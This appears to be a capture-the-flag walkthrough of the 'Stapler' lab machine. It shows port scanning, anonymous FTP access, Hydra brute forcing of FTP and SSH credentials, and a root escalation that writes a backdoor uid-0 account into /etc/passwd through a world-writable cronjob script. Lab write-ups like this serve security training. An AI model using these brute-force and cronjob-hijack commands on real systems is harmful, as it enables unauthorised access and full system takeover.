# Stapler: Walkthrough

## Overview
**Machine Name**: Stapler
**Platform**: Proving Grounds
**Difficulty**: Medium
**OS**: Linux (Ubuntu)
**Focus**: FTP Anonymous Login, PCAP Analysis, Hydra SSH Brute Forcing, Writable Cronjob Privilege Escalation

## Enumeration
### Network Discovery
An Nmap sweep was performed to locate the target machine IP address: `192.168.51.148`.
![](screenshots/Pasted%20image%2020260617191728.png)

### Port Scanning
A full TCP port scan was executed:
```bash
nmap -T4 -p- -Pn 192.168.51.148
```
Results:
| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | ftp | vsftpd 2.0.8 or later |
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4 |
| 53/tcp | domain | tcpwrapped |
| 80/tcp | http | PHP cli server 5.5 or later (404 Not Found) |
| 139/tcp | netbios-ssn| Samba smbd 4.3.9-Ubuntu |
| 666/tcp | doom | tcpwrapped |
| 3306/tcp | mysql | MySQL 5.7.12-0ubuntu1 |
| 12380/tcp| http | Apache httpd 2.4.18 (Ubuntu) |

### Service-Specific Enumeration
An aggressive scan was conducted against ports `20, 21, 22, 53, 80, 3306`:
![](screenshots/Pasted%20image%2020260617192053.png)
And against ports `123, 137, 138, 139, 666, 12380`:
```bash
nmap -Pn -sT -A -oA CommonPorts -p 123,137,138,139,666,12380 192.168.51.148
```

1. **Web Port 80**: Accessing port 80 directly returned "404 Not Found":
   ![](screenshots/Pasted%20image%2020260617192427.png)
   Directory fuzzing with large wordlists found nothing significant.
   ![](screenshots/Pasted%20image%2020260617192951.png)

2. **Web Port 12380**: Accessing Apache on port 12380 revealed a landing page with a title referring to Initech:
   ![](screenshots/Pasted%20image%2020260617193131.png)
   Directory busting did not yield significant results here.

3. **FTP Port 21**: Anonymous login was accepted:
   ![](screenshots/Pasted%20image%2020260617194519.png)
   Although direct directory listing failed in PASV mode, a note file was successfully retrieved from the server:
   ![](screenshots/Pasted%20image%2020260617194614.png)
   ![](screenshots/Pasted%20image%2020260617194730.png)
   The note listed four employee names (Tim, Elly, John, etc.).

4. **SSH Port 22**: A banner asking to place something there was displayed:
   ![](screenshots/Pasted%20image%2020260617195519.png)

5. **SMB Port 139**: Samba shares were listed using guest access:
   ```bash
   smbclient -L //192.168.51.148
   ```
   ![](screenshots/Pasted%20image%2020260617200036.png)
   Attempts to connect to the shares directly failed:
   ![](screenshots/Pasted%20image%2020260617200251.png)

6. **DNS Port 53**: DNS enumeration was attempted but yielded no zones:
   ![](screenshots/Pasted%20image%2020260617201306.png)

7. **Doom Port 666**: Grabbing the port banner returned raw binary data resembling a zip file.
   ![](screenshots/Pasted%20image%2020260619120422.png)
   The data was downloaded using `wget`:
   ![](screenshots/Pasted%20image%2020260619120445.png)
   Unzipping the file revealed a JPEG image:
   ![](screenshots/Pasted%20image%2020260619120503.png)
   ![](screenshots/Pasted%20image%2020260619120515.png)
   Analyzing the image contents revealed a potential cookie string `CDEFGHIJSTUVWXYZcdefghijstuvwxyz`.
   ![](screenshots/Pasted%20image%2020260619120604.png)

## Exploitation
### FTP Hydra Brute Force
A usernames list `usernames.txt` was compiled using the names found in the FTP notes. 
Hydra was run against the FTP service:
![](screenshots/Pasted%20image%2020260619121558.png)

This matched valid credentials for `elly`:
`elly` : `ylle`
![](screenshots/Pasted%20image%2020260619122732.png)

### Account Access & Passwd Harvesting
Logging into the FTP server as `elly` allowed downloading `/etc/passwd` and `/etc/group` files:
![](screenshots/Pasted%20image%2020260619123646.png)

The files were parsed to extract usernames with shell access (`/bin/bash` or `/bin/sh`):
```bash
grep -e "/bin/bash" -e "/bin/sh" passwd | cut -d ":" -f1 > sshusernames.txt
```
![](screenshots/Pasted%20image%2020260619123757.png)
![](screenshots/Pasted%20image%2020260619124129.png)

### SSH Hydra Brute Force
Hydra was executed against SSH using the extracted shell usernames:
```bash
hydra -L sshusernames.txt -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.51.148
```
This matched credentials for one of the users:
![](screenshots/Pasted%20image%2020260619124326.png)

Logging in via SSH:
```bash
ssh <user>@192.168.51.148
```

## Privilege Escalation
### Local Enumeration
Basic privilege escalation checks were executed:
![](screenshots/Pasted%20image%2020260619124447.png)
![](screenshots/Pasted%20image%2020260619124507.png)

A cron job was found running as `root` every 5 minutes:
![](screenshots/Pasted%20image%2020260619125244.png)
The script executed by the cronjob was writable by everyone.

### Cronjob Hijack
The writable script was updated to append a new root user `newroot` to `/etc/passwd`:
```bash
echo 'echo "newroot:lMYfwJF/nQvnc:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /path/to/script
```
![](screenshots/Pasted%20image%2020260619130030.png)
![](screenshots/Pasted%20image%2020260619130058.png)

### Root Access
After the cronjob triggered, a login to `newroot` was completed:
```bash
su newroot
whoami
root
```

## Post-Exploitation
### Flag Recovery
- Local Flag:
  ![](screenshots/Pasted%20image%2020260619130258.png)
- Root Flag:
  ![](screenshots/Pasted%20image%2020260619130220.png)

## Lessons Learned
1. Ensure files exposed on port banners (like port 666) or anonymous FTP shares do not leak employee names or system configuration details.
2. Restrict write permissions on scripts executed by system cronjobs, ensuring they are only editable by root.
